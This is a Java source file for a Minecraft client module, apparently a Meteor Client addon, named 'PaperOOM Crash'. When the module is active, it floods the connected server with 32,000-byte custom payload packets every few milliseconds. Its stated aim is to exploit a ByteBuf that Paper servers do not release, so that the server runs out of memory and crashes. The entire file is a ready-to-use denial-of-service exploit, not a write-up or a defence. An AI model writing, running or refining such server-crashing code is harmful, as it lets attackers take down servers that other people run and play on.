package com.x310.clarity.modules.crashers;

import com.x310.clarity.Main;
import com.x310.clarity.utils.payload.PaperCustomPayload;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

public class PaperOOMCrash extends Module {
    private final SettingGroup sg = settings.createGroup("Paper OOM");
    private final Setting<Boolean> disableOnLeave = sg.add(new BoolSetting.Builder()
        .name("disable-on-leave")
        .description("Disables spam when you leave a server.")
        .defaultValue(true)
        .build()
    );

    private void stopOomThread() {
        running = false;
        thread = null;
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        if (disableOnLeave.get()) {
            toggle();
            stopOomThread();
        }
    }

    private final Setting<Integer> interval = sg.add(new IntSetting.Builder()
        .name("Delay")
        .description("Milliseconds between packets.")
        .defaultValue(2)
        .min(2)
        .max(10)
        .sliderMax(10)
        .build()
    );

    private Thread thread;
    private volatile boolean running = false;

    public PaperOOMCrash() {
        super(Main.CRASH_GROUP, "PaperOOM Crash", "Abuses a flaw where a ByteBuf is not properly released to cause OutOfMemoryError");
    }

    @Override
    public void onActivate() {
        running = true;
        thread = new Thread(() -> {
            if (mc.player == null || mc.getNetworkHandler() == null) return;
            ClientPlayNetworkHandler handler = mc.getNetworkHandler();
            CustomPayloadC2SPacket packet = new CustomPayloadC2SPacket(new PaperCustomPayload(new byte[32000]));

            while (running) {
                try {
                    handler.sendPacket(packet);
                    Thread.sleep(interval.get());
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
        thread.setName("PaperOOMCrash-Thread");
        thread.setDaemon(true);
        thread.start();
    }

    @Override
    public void onDeactivate() {
        running = false;
        thread = null;
    }
}
